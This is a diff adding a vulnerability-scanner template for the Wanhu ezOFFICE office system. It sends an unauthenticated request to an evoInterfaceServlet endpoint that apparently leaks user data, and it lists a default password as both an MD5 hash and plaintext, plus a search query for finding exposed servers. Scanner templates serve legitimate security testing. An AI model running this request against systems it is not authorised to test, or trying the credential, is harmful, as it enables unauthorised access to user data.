@@ -1,0 +1,21 @@
+id: wanhu-ez-office-unleak
+info:
+  name: wanhu-ez-office-unleak
+  author: sb
+  severity: critical
+  tags: unleak
+  description: 默认密码是 B78B361D6A587FD69090CBEDD08507FB  MD5解密之后是 sd111111
+  metadata:
+    hunter-query: app="万户网络-ezOFFICE"
+
+http:
+  - raw:
+      - |
+        GET /defaultroot/evoInterfaceServlet?paramType=user HTTP/1.1
+
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_1 == 200 && contains(body_1,"result")'
